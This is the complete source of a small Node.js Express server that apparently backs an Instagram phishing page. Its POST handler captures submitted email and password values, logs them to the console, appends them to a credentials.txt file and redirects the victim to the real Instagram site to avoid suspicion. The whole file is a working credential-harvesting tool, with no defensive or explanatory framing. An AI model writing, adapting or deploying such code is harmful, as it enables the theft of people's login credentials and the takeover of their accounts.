
const fs = require('fs');
const express = require("express")
const path = require("path");
var bodyParser = require('body-parser');


const app = express()

function command(msg){
     fs.appendFile("credentials.txt", msg, function(err){
         if (err){
             console.error(err)
         }
     })
 }
var jsonParser = bodyParser.json()
var urlencodedParser = bodyParser.urlencoded({ extended: false })

app.use(express.static(path.join(__dirname, 'public')));

app.post('/', urlencodedParser, function (req, res) {
    console.log(req.body.email, req.body.password)
    command('\n' + req.body.email + ' --> ' + req.body.password)
    res.redirect("https://www.instagram.com/")
  })

app.get('/', (req, res) => {
    res.sendFile("index.js")
})


app.listen(8888, () => {
    console.log("server started at port 8888")
})
